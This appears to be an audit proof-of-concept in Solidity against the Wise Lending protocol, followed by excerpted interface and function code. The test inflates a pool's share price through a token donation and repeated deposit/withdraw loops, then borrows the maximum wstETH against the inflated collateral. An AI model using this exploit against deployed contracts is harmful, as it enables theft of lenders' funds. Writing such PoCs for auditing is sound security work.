function test_poc() public {
    deal(pendleLPT, address(this), 1 ether);

    IERC20(pendleLPT).approve(poolToken, MAX);

    Pool(poolToken).depositExactAmount(1 ether);

    IERC20(poolToken).approve(address(wiseLending), MAX);

    uint256 nftId = nft.mintPosition();

    wiseLending.depositExactAmount(nftId, poolToken, 1e9);

    IERC20(poolToken).transfer(address(wiseLending), 1e9);

    (uint256 pseudoTotalPool, uint256 totalDepositShares,) = wiseLending.lendingPoolData(poolToken);

    skip(5 seconds);

    uint256 share = wiseLending.getPositionLendingShares(nftId, poolToken);

    // withdraw all shares
    wiseLending.withdrawExactShares(nftId, poolToken, share);

    uint256 i = 0;
    do {
        (pseudoTotalPool, totalDepositShares,) = wiseLending.lendingPoolData(poolToken);
        share = wiseLending.depositExactAmount(nftId, poolToken, pseudoTotalPool * 2 - 1);

        wiseLending.withdrawExactAmount(nftId, poolToken, share);
        ++i;
    } while (i < 20);

    (pseudoTotalPool, totalDepositShares,) = wiseLending.lendingPoolData(poolToken);
    share = wiseLending.depositExactAmount(nftId, poolToken, pseudoTotalPool * 2 - 1);
    (pseudoTotalPool, totalDepositShares,) = wiseLending.lendingPoolData(poolToken);

    IERC20(poolToken).transfer(other, IERC20(poolToken).balanceOf(address(this)));
    vm.startPrank(other);
    nftId = nft.mintPosition();
    IERC20(poolToken).approve(address(wiseLending), MAX);

    wiseLending.depositExactAmount(nftId, poolToken, IERC20(poolToken).balanceOf(other));

    uint256 amount = IWiseSecurity(wiseSecurity).maximumBorrowToken(nftId, poolToken, 0);

    wiseLending.borrowExactAmount(nftId, wsteth, amount);
}

function depositExactAmount(
    uint256 _nftId,
    address _underlyingAsset,
    uint256 _amount
)
    external
    returns (uint256);

function depositExactAmountETH(
    uint256 _nftId
)
    external
    payable
    returns (uint256);

    function latestRoundData()
        public
        view
        returns (
            uint80 roundId,
            int256 answer,
            uint256 startedAt,
            uint256 updatedAt,
            uint80 answeredInRound
        )
    {
        answer = int256(
            latestAnswer()
        );

        (
            roundId,
            ,
            startedAt,
            updatedAt,
            answeredInRound

        ) = ST_ETH_FEED.latestRoundData();
    }
}

function getRoundData(
    uint80 _roundId
)
    external
    view
    returns (
        uint80 roundId,
        int256 answer,
        uint256 startedAt,
        uint256 updatedAt,
        uint80 answeredInRound
    )
{
    (
        roundId,
        answer,
        startedAt,
        updatedAt,
        answeredInRound

    ) = ST_ETH_FEED.getRoundData(
        _roundId
    );
}

function lendingPoolData(
    address _poolToken
)
    external
    view
    returns (LendingPoolEntry memory);

function getPositionLendingShares(
    uint256 _nftId,
    address _poolToken
)
    external
    view
    returns (uint256);

function withdrawExactShares(
    uint256 _nftId,
    address _underlyingAsset,
    uint256 _shares
)
    external
    returns (uint256);

    function withdrawExactAmount(
        uint256 _nftId,
        address _token,
        uint256 _amount
    )
        external
        returns (uint256);
}

function maximumBorrowToken(
    uint256 _nftId,
    address _poolToken,
    uint256 _interval
)
    external
    view
    returns (uint256 tokenAmount)
{
    uint256 term = _overallETHCollateralsWeighted(_nftId, _interval)
        * borrowPercentageCap
        / PRECISION_FACTOR_E18;

    uint256 borrowETH = term
        - _overallETHBorrow(
            _nftId,
            _interval
        );

    tokenAmount = WISE_ORACLE.getTokensFromETH(
        _poolToken,
        borrowETH
    );

    uint256 maxPoolAmount = WISE_LENDING.getTotalPool(
        _poolToken
    );

    if (tokenAmount > maxPoolAmount) {
        tokenAmount = maxPoolAmount;
    }
}

function borrowExactAmount(
    uint256 _nftId,
    address _underlyingAsset,
    uint256 _borrowAmount
)
    external
    returns (uint256);
